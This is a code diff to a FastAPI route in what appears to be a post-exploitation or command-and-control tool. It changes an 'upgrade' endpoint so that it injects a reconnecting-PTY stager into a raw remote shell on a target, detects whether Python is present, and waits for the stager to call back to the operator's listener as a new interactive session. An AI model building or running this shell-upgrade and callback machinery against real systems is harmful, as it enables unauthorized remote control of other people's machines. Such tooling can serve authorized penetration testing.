@@ -111,6 +111,7 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
     async def upgrade(session_id: str):
         """Auto-pivot: push a reconnecting-PTY stager into a RAW shell so it upgrades itself
         into a robust session — no manual stabilize dance ('shell of a shell')."""
+        import asyncio
         import uuid
         from ...sessions.stagers import upgrade_command
         sess = mgr.get(session_id)
@@ -124,9 +125,23 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             raise HTTPException(409, "cannot determine a callback address for this shell")
         lhost, port = sess.local_addr            # the exact endpoint the target already reached
         token = "up_" + uuid.uuid4().hex[:12]
-        await sess.send(upgrade_command(lhost, port, token).encode() + b"\n")
         broker.publish({"type": "session", "event": "upgrading", "id": sess.id})
-        return {"ok": True, "callback": f"{lhost}:{port}"}
+        # inject the stager and read the detection result (RECCE_UPGRADE_SENT / RECCE_NO_PYTHON)
+        # detection echoes back fast on a live shell; the long tail is only a dead/hung shell
+        out = await sess.run_and_capture(upgrade_command(lhost, port, token).encode(), timeout=6.0)
+        cb = f"{lhost}:{port}"
+        if b"RECCE_NO_PYTHON" in out:
+            return {"ok": True, "upgraded": False, "callback": cb,
+                    "reason": "no python/base64 on the target — use a manual payload from the catalog"}
+        # wait for the stager to actually call back (a new PTY session carrying our token)
+        for _ in range(20):                      # ~10s
+            new = next((s for s in mgr.sessions.values()
+                        if s.token == token and s.pty and s.status == "live"), None)
+            if new:
+                return {"ok": True, "upgraded": True, "session_id": new.id, "callback": cb}
+            await asyncio.sleep(0.5)
+        return {"ok": True, "upgraded": False, "callback": cb,
+                "reason": f"stager launched but didn't call back — egress to {cb} may be blocked"}
 
     async def _push_file(sess, remote_path: str, data: bytes) -> None:
         """Write bytes to a file on the target through the shell, chunked so no single line
